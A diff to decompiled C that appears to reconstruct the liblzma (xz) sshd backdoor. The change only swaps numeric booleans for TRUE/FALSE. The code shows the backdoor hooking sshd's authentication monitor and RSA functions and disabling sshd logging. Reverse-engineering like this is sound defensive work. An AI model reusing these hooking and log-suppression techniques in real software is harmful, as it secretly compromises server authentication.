@@ -157,7 +157,7 @@ LAB_00105951:
       local_a88.elf_handles = peVar3;
       local_a88.dynamic_linker_ehdr = string_begin;
       BVar26 = main_elf_parse(&local_a88);
-      if (BVar26 != 0) {
+      if (BVar26 != FALSE) {
         local_980.import_resolver = get_lzma_allocator();
         lVar45 = 0;
         do {
@@ -173,13 +173,13 @@ LAB_00105951:
         local_a68.elf_handles = peVar3;
         local_a68.libc_imports = &local_980.libc_imports;
         BVar26 = process_shared_libraries(&local_a68);
-        if (BVar26 == 0) goto LAB_00105a59;
+        if (BVar26 == FALSE) goto LAB_00105a59;
         local_b10 = *params->hook_params->hooks_data_addr;
         ctx = &local_b10->global_ctx;
         imported_funcs = &local_b10->imported_funcs;
         pgVar50 = ctx;
         for (lVar45 = 0x5a; lVar45 != 0; lVar45 = lVar45 + -1) {
-          pgVar50->uses_endbr64 = 0;
+          pgVar50->uses_endbr64 = FALSE;
           pgVar50 = (global_context_t *)((long)pgVar50 + (ulong)bVar63 * -8 + 4);
         }
         (local_b10->global_ctx).sshd_log_ctx = &local_b10->sshd_log_ctx;
@@ -216,7 +216,7 @@ LAB_00105951:
           (local_b10->ldso_ctx).hook_EVP_PKEY_set1_RSA = ppVar12;
           psVar52 = &local_b10->sshd_ctx;
           for (lVar45 = 0x38; lVar45 != 0; lVar45 = lVar45 + -1) {
-            psVar52->have_mm_answer_keyallowed = 0;
+            psVar52->have_mm_answer_keyallowed = FALSE;
             psVar52 = (sshd_ctx_t *)((long)psVar52 + (ulong)bVar63 * -8 + 4);
           }
           (local_b10->sshd_ctx).mm_answer_authpassword_hook =
@@ -226,7 +226,7 @@ LAB_00105951:
           (local_b10->sshd_ctx).mm_answer_keyverify = psVar13;
           psVar53 = &local_b10->sshd_log_ctx;
           for (lVar45 = 0x1a; lVar45 != 0; lVar45 = lVar45 + -1) {
-            psVar53->logging_disabled = 0;
+            psVar53->logging_disabled = FALSE;
             psVar53 = (sshd_log_ctx_t *)((long)psVar53 + (ulong)bVar63 * -8 + 4);
           }
           (local_b10->sshd_log_ctx).mm_log_handler = (_func_63 *)params->hook_params->mm_log_handler
@@ -258,7 +258,7 @@ LAB_00105951:
           }
           BVar26 = find_dl_audit_offsets(&local_980.data_handle,&local_ac8,local_b10,imported_funcs)
           ;
-          if (BVar26 == 0) goto LAB_00105a60;
+          if (BVar26 == FALSE) goto LAB_00105a60;
           plVar30 = get_lzma_allocator();
           plVar30->opaque = local_980.elf_handles.libcrypto;
           peVar31 = local_980.elf_handles.libcrypto;
@@ -277,7 +277,7 @@ LAB_00105951:
           local_9d8._0_8_ = (u8 *)0x0;
           pvVar27 = elf_get_code_segment(local_980.elf_handles.main,(u64 *)local_a30);
           puVar61 = (u8 *)(local_a30._0_8_ + (long)pvVar27);
-          pvVar33 = elf_get_data_segment(elf_info,(u64 *)local_9d8,0);
+          pvVar33 = elf_get_data_segment(elf_info,(u64 *)local_9d8,FALSE);
           (local_b10->global_ctx).sshd_code_start = pvVar27;
           (local_b10->global_ctx).sshd_code_end = puVar61;
           (local_b10->global_ctx).sshd_data_start = pvVar33;
@@ -342,7 +342,7 @@ LAB_00105951:
           BVar26 = sshd_find_sensitive_data
                              (local_980.elf_handles.main,local_980.elf_handles.libcrypto,
                               &local_980.string_refs,imported_funcs,ctx);
-          if (BVar26 == 0) goto LAB_00105a60;
+          if (BVar26 == FALSE) goto LAB_00105a60;
           if (pEVar36 != (Elf64_Sym *)0x0) {
             EVar15 = pEVar36->st_value;
             pEVar16 = (local_980.elf_handles.libcrypto)->elfbase;
@@ -376,10 +376,10 @@ LAB_00105951:
           psVar52 = (local_b10->global_ctx).sshd_ctx;
           local_a30._0_8_ = (u8 *)0x0;
           local_a98 = local_a98 & 0xffffffff00000000;
-          psVar52->have_mm_answer_keyallowed = 0;
-          psVar52->have_mm_answer_authpassword = 0;
-          psVar52->have_mm_answer_keyverify = 0;
-          pvVar27 = elf_get_data_segment(local_980.elf_handles.main,(u64 *)local_a30,0);
+          psVar52->have_mm_answer_keyallowed = FALSE;
+          psVar52->have_mm_answer_authpassword = FALSE;
+          psVar52->have_mm_answer_keyverify = FALSE;
+          pvVar27 = elf_get_data_segment(local_980.elf_handles.main,(u64 *)local_a30,FALSE);
           uVar23 = local_a30._0_8_;
           if ((pvVar27 != (void *)0x0) &&
              (local_980.string_refs.entries[0x12].func_start != (void *)0x0)) {
@@ -394,7 +394,7 @@ LAB_00105951:
                                     &psVar52->mm_answer_authpassword_start,
                                     &psVar52->mm_answer_authpassword_end,
                                     &psVar52->mm_answer_authpassword_ptr,peVar31,
-                                    &local_980.string_refs,ctx), BVar26 == 0)) {
+                                    &local_980.string_refs,ctx), BVar26 == FALSE)) {
               psVar52->mm_answer_authpassword_start = (void *)0x0;
               psVar52->mm_answer_authpassword_end = (void *)0x0;
               psVar52->mm_answer_authpassword_ptr = (sshd_monitor_func_t *)0x0;
@@ -408,7 +408,7 @@ LAB_00105951:
                                   &psVar52->mm_answer_keyallowed_end,
                                   &psVar52->mm_answer_keyallowed_ptr,peVar31,&local_980.string_refs,
                                   ctx);
-              if (BVar26 == 0) {
+              if (BVar26 == FALSE) {
                 psVar52->mm_answer_keyallowed_start = (sshd_monitor_func_t *)0x0;
                 psVar52->mm_answer_keyallowed_end = (void *)0x0;
                 psVar52->mm_answer_keyallowed_ptr = (void *)0x0;
@@ -419,7 +419,7 @@ LAB_00105951:
                                     &psVar52->mm_answer_keyverify_end,
                                     &psVar52->mm_answer_keyverify_ptr,peVar31,&local_980.string_refs
                                     ,ctx);
-                if (BVar26 == 0) {
+                if (BVar26 == FALSE) {
                   psVar52->mm_answer_keyverify_start = (void *)0x0;
                   psVar52->mm_answer_keyverify_end = (void *)0x0;
                   psVar52->mm_answer_keyverify_ptr = (void *)0x0;
@@ -439,7 +439,7 @@ LAB_00105951:
               else {
                 puVar61 = (u8 *)psVar17->mm_answer_authpassword_end;
               }
-              used_relr_lookup = false;
+              used_relr_lookup = FALSE;
               pcVar37 = (char *)0x0;
               local_a90 = CONCAT44(local_a90._4_4_,0x198);
               while (pcVar37 = elf_find_string(peVar31,(EncodedStringId *)&local_a90,pcVar37),
@@ -449,25 +449,25 @@ LAB_00105951:
                 mem_address = elf_find_rela_reloc(peVar31,EVar25,0);
                 if (mem_address == (Elf64_Rela *)0x0) {
                   local_9d8._0_8_ = (u8 *)0x0;
-                  used_relr_lookup = true;
+                  used_relr_lookup = TRUE;
                   mem_address = (Elf64_Rela *)elf_find_relr_reloc(peVar31,EVar25);
                 }
                 while (mem_address != (Elf64_Rela *)0x0) {
                   do {
                     BVar26 = elf_contains_vaddr_relro(peVar31,(u64)mem_address,8,1);
-                    if ((BVar26 != 0) &&
+                    if ((BVar26 != FALSE) &&
                        (BVar26 = find_instruction_with_mem_operand_ex
                                            ((u8 *)code_start,puVar61,(dasm_ctx_t *)0x0,0x109,
-                                            mem_address), BVar26 != 0)) {
+                                            mem_address), BVar26 != FALSE)) {
                       pvVar33 = psVar52->mm_answer_authpassword_start;
                       ((local_b10->global_ctx).sshd_ctx)->STR_unknown_ptr = (char *)mem_address;
                       if (pvVar33 != (void *)0x0) {
-                        psVar52->have_mm_answer_authpassword = 1;
+                        psVar52->have_mm_answer_authpassword = TRUE;
                       }
                       if ((psVar52->mm_answer_keyallowed_start != (sshd_monitor_func_t *)0x0) &&
-                         (psVar52->have_mm_answer_keyallowed = 1,
+                         (psVar52->have_mm_answer_keyallowed = TRUE,
                          psVar52->mm_answer_keyverify_start != (void *)0x0)) {
-                        psVar52->have_mm_answer_keyverify = 1;
+                        psVar52->have_mm_answer_keyverify = TRUE;
                       }
                       piVar43 = (int *)find_addr_referenced_in_mov_instruction
                                                  (XREF_start_pam,&local_980.string_refs,pvVar27,
@@ -476,7 +476,7 @@ LAB_00105951:
                         ((local_b10->global_ctx).sshd_ctx)->use_pam_ptr = piVar43;
                       }
                       stringId_inOut = (EncodedStringId *)local_9d8;
-                      used_relr_lookup = false;
+                      used_relr_lookup = FALSE;
                       local_9d8._8_4_ = 0x70;
                       local_9d8._0_8_ = (u8 *)0xc5800000948;
                       goto LAB_00106471;
@@ -487,7 +487,7 @@ LAB_00105951:
                   local_9d8._0_8_ = (u8 *)0x0;
 LAB_001063c8:
                   mem_address = (Elf64_Rela *)elf_find_relr_reloc(peVar31,EVar25);
-                  used_relr_lookup = true;
+                  used_relr_lookup = TRUE;
                 }
                 pcVar37 = pcVar37 + 8;
               }
@@ -518,7 +518,7 @@ LAB_00106471:
         psVar52->_unknown1186[3] = '\0';
         goto LAB_001064b8;
       }
-      used_relr_lookup = true;
+      used_relr_lookup = TRUE;
     }
     stringId_inOut = stringId_inOut + 1;
   } while (stringId_inOut != (EncodedStringId *)(local_9d8 + 0xc));
@@ -533,7 +533,7 @@ LAB_001064b8:
                               (u8 *)(uVar23 + (long)pvVar27));
   if (piVar43 != (int *)0x0) {
     if ((*(int *)((local_b10->global_ctx).sshd_ctx)->_unknown1186 != 0) &&
-       ((local_b10->global_ctx).uses_endbr64 != 0)) {
+       ((local_b10->global_ctx).uses_endbr64 != FALSE)) {
       iVar62 = 0;
       lVar45 = 0;
       local_9d8._8_4_ = 0x10;
@@ -545,9 +545,9 @@ LAB_001064b8:
           puVar47 = (u8 *)local_980.string_refs.entries[*(uint *)(local_9d8 + lVar45 * 4)].func_end;
           iVar62 = iVar62 + 1;
           BVar26 = find_instruction_with_mem_operand(puVar61,puVar47,(dasm_ctx_t *)0x0,piVar43);
-          if ((BVar26 != 0) ||
+          if ((BVar26 != FALSE) ||
              (BVar26 = find_add_instruction_with_mem_operand
-                                 (puVar61,puVar47,(dasm_ctx_t *)0x0,piVar43), BVar26 != 0)) {
+                                 (puVar61,puVar47,(dasm_ctx_t *)0x0,piVar43), BVar26 != FALSE)) {
             hooks = (backdoor_hooks_data_t *)(ulong)((int)hooks + 1);
           }
         }
@@ -560,24 +560,24 @@ LAB_001064b8:
 LAB_001065af:
   pEVar39 = elf_symbol_get(local_980.elf_handles.libcrypto,STR_EVP_DecryptFinal_ex,0);
   BVar26 = sshd_find_monitor_struct(local_980.elf_handles.main,&local_980.string_refs,ctx);
-  if (BVar26 == 0) {
-    (local_b10->sshd_ctx).have_mm_answer_keyallowed = 0;
-    (local_b10->sshd_ctx).have_mm_answer_keyverify = 0;
+  if (BVar26 == FALSE) {
+    (local_b10->sshd_ctx).have_mm_answer_keyallowed = FALSE;
+    (local_b10->sshd_ctx).have_mm_answer_keyverify = FALSE;
   }
   psVar53 = (local_b10->global_ctx).sshd_log_ctx;
   plVar28->opaque = local_980.elf_handles.libc;
   local_a98 = 0;
-  psVar53->logging_disabled = 0;
-  psVar53->log_hooking_possible = 0;
+  psVar53->logging_disabled = FALSE;
+  psVar53->log_hooking_possible = FALSE;
   pvVar27 = elf_get_code_segment(&local_980.main_info,&local_a98);
   uVar10 = local_a98;
   if ((((pvVar27 != (void *)0x0) && (0x10 < local_a98)) &&
       ((u8 *)local_980.string_refs.entries[0x19].func_start != (u8 *)0x0)) &&
-     (((local_b10->global_ctx).uses_endbr64 == 0 ||
+     (((local_b10->global_ctx).uses_endbr64 == FALSE ||
       (BVar26 = is_endbr64_instruction
                           ((u8 *)local_980.string_refs.entries[0x19].func_start,
                            (u8 *)((long)local_980.string_refs.entries[0x19].func_start + 4),0xe230),
-      BVar26 != 0)))) {
+      BVar26 != FALSE)))) {
     psVar53->sshlogv = local_980.string_refs.entries[0x19].func_start;
     puVar55 = (undefined4 *)local_a30;
     for (lVar45 = 0x16; lVar45 != 0; lVar45 = lVar45 + -1) {
@@ -589,12 +589,12 @@ LAB_001065af:
       local_b20 = (u8 *)0x0;
       puVar61 = (u8 *)0x0;
       do {
-        while( true ) {
+        while( TRUE ) {
           if ((local_980.string_refs.entries[0x1a].func_end <= local_b48) ||
              ((local_b20 != (u8 *)0x0 && (puVar61 != (u8 *)0x0)))) goto LAB_00106bf0;
           BVar26 = x86_dasm((dasm_ctx_t *)local_a30,local_b48,
                             (u8 *)local_980.string_refs.entries[0x1a].func_end);
-          if (BVar26 != 0) break;
+          if (BVar26 != FALSE) break;
           local_b48 = local_b48 + 1;
         }
         if ((local_a30._40_4_ & 0xfffffffd) == 0xb1) {
@@ -644,9 +644,9 @@ LAB_001067fb:
               uVar4 = uVar4 + 1) {
             if ((puVar47 != (u8 *)0x0) && (puVar61 != (u8 *)0x0)) goto LAB_00106b3c;
             BVar26 = find_mov_instruction
-                               (puVar56,(u8 *)local_980.string_refs.entries[0x1a].func_end,1,0,
-                                (dasm_ctx_t *)local_9d8);
-            if (BVar26 == 0) break;
+                               (puVar56,(u8 *)local_980.string_refs.entries[0x1a].func_end,TRUE,
+                                FALSE,(dasm_ctx_t *)local_9d8);
+            if (BVar26 == FALSE) break;
             if ((local_9d8._16_2_ & 0x1040) != 0) {
               if ((local_9d8._16_2_ & 0x40) == 0) {
                 uVar59 = local_9d8[0x11] & 0x10;
@@ -673,7 +673,7 @@ LAB_001068e4:
                           CONCAT44(local_9d8._12_4_,local_9d8._8_4_);
               }
               local_a90 = 0;
-              puVar44 = (u8 *)elf_get_data_segment(&local_980.main_info,&local_a90,0);
+              puVar44 = (u8 *)elf_get_data_segment(&local_980.main_info,&local_a90,FALSE);
               if ((((puVar44 == (u8 *)0x0) || (puVar44 + local_a90 <= puVar46)) ||
                   (puVar46 < puVar44)) ||
                  (((puVar46 == puVar61 && (puVar46 == puVar47)) ||
@@ -698,11 +698,11 @@ LAB_00106b3c:
                                (puVar47,puVar61,pvVar27,(u8 *)((long)pvVar27 + uVar10),
                                 &local_980.string_refs,ctx);
             local_b20 = puVar47;
-            if (BVar26 != 0) {
+            if (BVar26 != FALSE) {
               psVar53->log_handler_ptr = puVar47;
               peVar31 = &local_980.main_info;
               psVar53->log_handler_ctx_ptr = puVar61;
-              psVar53->log_hooking_possible = 1;
+              psVar53->log_hooking_possible = TRUE;
               local_9d8._0_4_ = 0x708;
               pcVar37 = elf_find_string(peVar31,(EncodedStringId *)local_9d8,(void *)0x0);
               psVar53->STR_percent_s = pcVar37;
@@ -727,7 +727,7 @@ LAB_00106b3c:
                   }
                 }
               }
-              psVar53->logging_disabled = 1;
+              psVar53->logging_disabled = TRUE;
               break;
             }
           }
@@ -739,7 +739,7 @@ LAB_00106b3c:
             puVar47 = (u8 *)(local_a30._0_8_ + local_a30._8_8_ + local_a30._48_8_);
           }
           local_9d8._0_8_ = (u8 *)0x0;
-          puVar56 = (u8 *)elf_get_data_segment(&local_980.main_info,(u64 *)local_9d8,0);
+          puVar56 = (u8 *)elf_get_data_segment(&local_980.main_info,(u64 *)local_9d8,FALSE);
           if (((puVar56 != (u8 *)0x0) && (puVar47 < (u8 *)(local_9d8._0_8_ + (long)puVar56))) &&
              (puVar56 <= puVar47)) {
             pdVar57 = (dasm_ctx_t *)local_9d8;
@@ -751,7 +751,7 @@ LAB_00106b3c:
               BVar26 = find_instruction_with_mem_operand_ex
                                  (puVar61,(u8 *)local_980.string_refs.entries[0x1a].func_end,
                                   (dasm_ctx_t *)local_9d8,0x147,(void *)0x0);
-              if (BVar26 == 0) break;
+              if (BVar26 == FALSE) break;
               if ((local_998 == 0) && ((local_9d8._16_2_ & 0x100) != 0)) {
                 puVar61 = (u8 *)local_9d8._48_8_;
                 if ((local_9d8._28_4_ & 0xff00ff00) == 0x5000000) {
@@ -759,7 +759,7 @@ LAB_00106b3c:
                             CONCAT44(local_9d8._12_4_,local_9d8._8_4_);
                 }
                 local_a90 = 0;
-                puVar56 = (u8 *)elf_get_data_segment(&local_980.main_info,&local_a90,0);
+                puVar56 = (u8 *)elf_get_data_segment(&local_980.main_info,&local_a90,FALSE);
                 if ((((puVar56 != (u8 *)0x0) && (puVar61 < puVar56 + local_a90)) &&
                     (puVar56 <= puVar61)) && (puVar47 != puVar61)) goto LAB_00106b3c;
               }
@@ -771,7 +771,7 @@ LAB_00106b3c:
         }
 LAB_00106735:
         local_b48 = local_b48 + local_a30._8_8_;
-      } while( true );
+      } while( TRUE );
     }
   }
 LAB_00106bf0:
@@ -791,36 +791,36 @@ LAB_00106bf0:
     (local_b10->imported_funcs).EVP_DecryptFinal_ex = (_func_49 *)(pEVar16->e_ident + EVar15);
   }
   BVar26 = init_imported_funcs(imported_funcs);
-  if (((((((BVar26 != 0) &&
+  if (((((((BVar26 != FALSE) &&
           (lzma_free((local_b10->imported_funcs).EVP_MD_CTX_new,plVar30),
           (local_b10->libc_imports).resolved_imports_count == 0xc)) &&
          (BVar26 = secret_data_append_from_address
-                             ((void *)0x1,(secret_data_shift_cursor_t)0x145,0x78,0x18), BVar26 != 0)
-         ) && ((BVar26 = secret_data_append_from_address
-                                   (params->hook_params->symbind64,(secret_data_shift_cursor_t)0x12a
-                                    ,4,0x12), BVar26 != 0 &&
-               (BVar26 = secret_data_append_item
-                                   ((secret_data_shift_cursor_t)0x12e,0x13,4,0x20,
-                                    (u8 *)params->hook_params->hook_RSA_public_decrypt), BVar26 != 0
-               )))) &&
-       (BVar26 = secret_data_append_from_address
-                           (params->shared->hook_EVP_PKEY_set1_RSA,(secret_data_shift_cursor_t)0x132
-                            ,6,0x14), BVar26 != 0)) &&
+                             ((void *)0x1,(secret_data_shift_cursor_t)0x145,0x78,0x18),
+         BVar26 != FALSE)) &&
+        ((BVar26 = secret_data_append_from_address
+                             (params->hook_params->symbind64,(secret_data_shift_cursor_t)0x12a,4,
+                              0x12), BVar26 != FALSE &&
+         (BVar26 = secret_data_append_item
+                             ((secret_data_shift_cursor_t)0x12e,0x13,4,0x20,
+                              (u8 *)params->hook_params->hook_RSA_public_decrypt), BVar26 != FALSE))
+        )) && (BVar26 = secret_data_append_from_address
+                                  (params->shared->hook_EVP_PKEY_set1_RSA,
+                                   (secret_data_shift_cursor_t)0x132,6,0x14), BVar26 != FALSE)) &&
       ((BVar26 = secret_data_append_item
                            ((secret_data_shift_cursor_t)0x138,0x15,2,0x10,
-                            (u8 *)params->hook_params->hook_RSA_get0_key), BVar26 != 0 &&
+                            (u8 *)params->hook_params->hook_RSA_get0_key), BVar26 != FALSE &&
        (BVar26 = secret_data_append_item
                            ((secret_data_shift_cursor_t)0xee,0x10,0x26,0x20,
-                            (u8 *)params->hook_params->mm_answer_keyallowed), BVar26 != 0)))) &&
+                            (u8 *)params->hook_params->mm_answer_keyallowed), BVar26 != FALSE)))) &&
      ((BVar26 = secret_data_append_item
                           ((secret_data_shift_cursor_t)0x140,0x17,5,0x20,
-                           (u8 *)params->hook_params->mm_answer_keyverify), BVar26 != 0 &&
+                           (u8 *)params->hook_params->mm_answer_keyverify), BVar26 != FALSE &&
       (((BVar26 = secret_data_append_item
                             ((secret_data_shift_cursor_t)0x13a,0x16,6,0x20,
-                             (u8 *)params->shared->mm_answer_authpassword_hook), BVar26 != 0 &&
+                             (u8 *)params->shared->mm_answer_authpassword_hook), BVar26 != FALSE &&
         (BVar26 = secret_data_append_item
                             ((secret_data_shift_cursor_t)0x114,0x11,0x16,0x10,
-                             (u8 *)peVar34->elf_parse), BVar26 != 0)) &&
+                             (u8 *)peVar34->elf_parse), BVar26 != FALSE)) &&
        ((local_b10->global_ctx).num_shifted_bits == 0x1c8)))))) {
     *(local_b10->ldso_ctx).libcrypto_l_name = (char *)local_b10;
     local_980.main_map = local_980.main_map + local_ac8 + 8;
@@ -884,6 +884,6 @@ LAB_00105a81:
     *(undefined4 *)&(peVar49->got_ctx).cpuid_fn = uVar21;
     *(undefined4 *)&(peVar49->got_ctx).got_offset = uVar20;
   }
-  return 0;
+  return FALSE;
 }
 
